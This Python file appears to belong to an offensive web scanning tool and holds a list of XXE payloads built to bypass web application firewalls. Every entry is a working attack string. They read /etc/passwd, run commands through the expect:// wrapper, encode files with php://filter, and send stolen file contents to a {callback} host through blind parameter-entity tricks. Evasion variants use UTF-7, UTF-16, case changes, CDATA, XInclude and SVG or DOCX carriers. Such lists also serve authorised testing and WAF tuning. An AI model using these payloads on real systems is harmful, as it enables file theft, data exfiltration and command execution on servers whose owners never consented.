"""
XXE (XML External Entity) Payloads with WAF Bypass
"""

# 18. XXE Payloads - XML External Entity
XXE_PAYLOADS = [
    '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
    '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://{callback}">]><root>&xxe;</root>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///etc/hosts">]><data>&file;</data>',
    
    # ============================================
    # WAF BYPASS VARIATIONS FOR XXE
    # ============================================
    
    # Parameter entity
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://{callback}"> %xxe;]><foo>test</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'http://{callback}/?x=%file;\'>">%eval;%exfil;]><foo>test</foo>',
    
    # Case manipulation
    '<?XML version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
    
    # Encoding variations
    '<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    
    # CDATA bypass
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo><![CDATA[&xxe;]]></foo>',
    
    # UTF-7 bypass
    '<?xml version="1.0" encoding="UTF-7"?>+ADw-!DOCTYPE+ACA-foo+ACA-+AFs-+ADw-!ENTITY+ACA-xxe+ACA-SYSTEM+ACA-+ACI-file:///etc/passwd+ACI-+AD4-+AF0-+AD4-+ADw-foo+AD4-+ACY-xxe+ADs-+ADw-/foo+AD4-',
    
    # XInclude
    '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>',
    
    # PHP wrapper
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>',
    
    # Expect wrapper (RCE)
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>',
    
    # SVG XXE
    '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>',
    
    # XLSX/DOCX XXE
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Target="&xxe;"/></Relationships>',
    
    # Error-based XXE
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///nonexistent/%remote;"> %xxe;]><foo>test</foo>',
    
    # Blind XXE with parameter entities
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % remote SYSTEM "http://{callback}/evil.dtd"> %remote;]><foo>test</foo>',
]
